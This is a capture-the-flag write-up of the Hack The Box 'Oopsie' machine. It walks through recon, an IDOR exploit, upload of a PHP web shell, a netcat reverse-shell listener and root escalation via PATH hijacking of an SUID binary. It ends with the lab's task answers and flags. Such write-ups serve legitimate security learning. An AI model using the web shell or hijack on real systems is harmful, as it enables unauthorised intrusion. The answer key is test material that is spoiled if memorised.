---
layout: single
title: Oopsie - Hack The Box
excerpt: "In this machine, we are exploiting an IDOR with RCE. With respect to privilege escalation, we are taking advantage of leaked credential files and exploiting SUID files through PATH Hijacking."
date: 2025-03-16
classes: wide
header:
  teaser: /img2/oopsie.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Very Easy
tags:
  - IDOR
  - RCE
  - SUID
  - PATH Hijacking
---




![](/img2/Pasted%20image%2020250313133322.png)

## Introduction

> In this machine, we are exploiting an IDOR with RCE. With respect to privilege escalation, we are taking advantage of leaked credential files and exploiting SUID files through PATH Hijacking.

## Reconnaissance

- Connectivity

```bash
ping -c1 10.129.72.77
```

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.72.77
```

![](/img2/Pasted%20image%2020250313133514.png)

- Fuzzing with gobuster

```bash
gobuster dir -u megacorp.com -w /usr/share/wordlists/dirb/common.txt -t 100
```

![](/img2/Pasted%20image%2020250313141255.png)

- Intercept trafic with burpsuite

![](/img2/Pasted%20image%2020250313141418.png)

- Access to login pannel

![](/img2/Pasted%20image%2020250313141733.png)

## Exploitation

- Exploit IDOR

![](/img2/Pasted%20image%2020250313142251.png)

> Change id to 1

- Change cookie session in upload directory

![](/img2/Pasted%20image%2020250313142420.png)

![](/img2/Pasted%20image%2020250313142821.png)

- Upload php malicious file

```bash
echo "<?php system(\$_GET['cmd']); ?>" > cmd.php
```

![](/img2/Pasted%20image%2020250313143019.png)

- Execute command

```bash
curl http://megacorp.com/uploads/cmd.php?cmd=whoami
```

![](/img2/Pasted%20image%2020250313143251.png)

- Send reverse shell

![](/img2/Pasted%20image%2020250313144230.png)

```bash
nc -nlvp 9000
```

## Post-exploitation

- TTY 

https://invertebr4do.github.io/tratamiento-de-tty/

- Find user flag

![](/img2/Pasted%20image%2020250313144611.png)

- Find credentials file

![](/img2/Pasted%20image%2020250313150431.png)

- Change to robert user

![](/img2/Pasted%20image%2020250313150547.png)

- Find SUID files 

```bash
id
```

![](/img2/Pasted%20image%2020250316161355.png)

```bash
find / -perm -4000 -group bugtracker -ls 2>/dev/null
```

![](/img2/Pasted%20image%2020250316161459.png)

- Review /usr/bin/bugtracker

```bash
strings /usr/bin/bugtracker
```

![](/img2/Pasted%20image%2020250316162159.png)

- Exploit PATH Hijacking

```bash
export PATH=/tmp/:$PATH
echo "bash -p" > cat
chmod +x cat
/usr/bin/bugtracker
```

![](/img2/Pasted%20image%2020250316162516.png)

```bash
cat /root/root.txt
```

![](/img2/Pasted%20image%2020250316162908.png)

## Tasks

1. With what kind of tool can intercept web traffic?
> proxy

1. What is the path to the directory on the webserver that returns a login page?
> /cdn-cgi/login

1. What can be modified in Firefox to get access to the upload page?
> cookie

1. What is the access ID of the admin user?
> 34322

1. On uploading a file, what directory does that file appear in on the server?
> /uploads

1. What is the file that contains the password that is shared with the robert user?
> db.php

1. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
> find

1. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
> root

1. What SUID stands for?
> Set Owner User ID

1.  What is the name of the executable being called in an insecure manner?
> cat

1.  Submit user flag
 > f2c74ee8db7983851ab2a96a44eb7981

1.  Submit root flag
> af13b0bee69f8a877c3faf667f7beacf


![](/img2/Pasted%20image%2020250316163513.png)